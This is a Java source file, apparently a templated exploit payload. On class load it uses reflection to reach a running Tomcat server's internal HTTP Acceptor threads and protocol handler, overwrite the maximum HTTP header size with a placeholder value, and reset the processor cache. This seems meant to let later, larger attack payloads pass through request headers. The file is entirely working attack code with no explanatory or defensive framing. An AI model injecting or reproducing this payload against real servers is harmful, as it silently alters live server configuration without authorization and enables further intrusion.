package payload;

import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.http11.AbstractHttp11Protocol;
import org.apache.tomcat.util.net.AbstractEndpoint;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class ModifyTomcatMaxHeaderSize  {
    static {
        start();
    }
    private static synchronized void start() {
        try {
            Method m = Thread.class.getDeclaredMethod("getThreads");
            m.setAccessible(true);
            Thread[] ts = (Thread[])m.invoke(null, new Object[0]);
            for (int i = 0; i < ts.length; i++) {
                if (ts[i].getName().contains("http") && ts[i].getName().contains("Acceptor")) {
                    Field f_target = ts[i].getClass().getDeclaredField("target");
                    f_target.setAccessible(true);
                    Object ttarget = f_target.get(ts[i]);
                    Field target = null;
                    try {
                        target = ttarget.getClass().getDeclaredField("endpoint");
                    } catch (NoSuchFieldException ex) {
                        target = ttarget.getClass().getDeclaredField("this$0");
                    }
                    target.setAccessible(true);
                    Object endpoint = target.get(ttarget);
                    Field handler = null;
                    try {
                        handler = endpoint.getClass().getDeclaredField("handler");
                    } catch (NoSuchFieldException e) {
                        try {
                            handler = endpoint.getClass().getSuperclass().getDeclaredField("handler");
                        } catch (NoSuchFieldException ee) {
                            handler = endpoint.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                        }
                    }
                    handler.setAccessible(true);
                    Object handler1 = handler.get(endpoint);
                    Field proto = handler1.getClass().getDeclaredField("proto");
                    proto.setAccessible(true);
                    Field maxHttpHeaderSize = AbstractHttp11Protocol.class.getDeclaredField("maxHttpHeaderSize");
                    maxHttpHeaderSize.setAccessible(true);
                    maxHttpHeaderSize.set(proto.get(handler1), Integer.valueOf("{{max}}"));
                    Field processorCache = AbstractProtocol.class.getDeclaredField("processorCache");
                    processorCache.setAccessible(true);
                    processorCache.set(proto.get(handler1), Integer.valueOf(0));
                    AbstractEndpoint.Handler recylerHandler = (AbstractEndpoint.Handler)handler1;
                    recylerHandler.recycle();
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
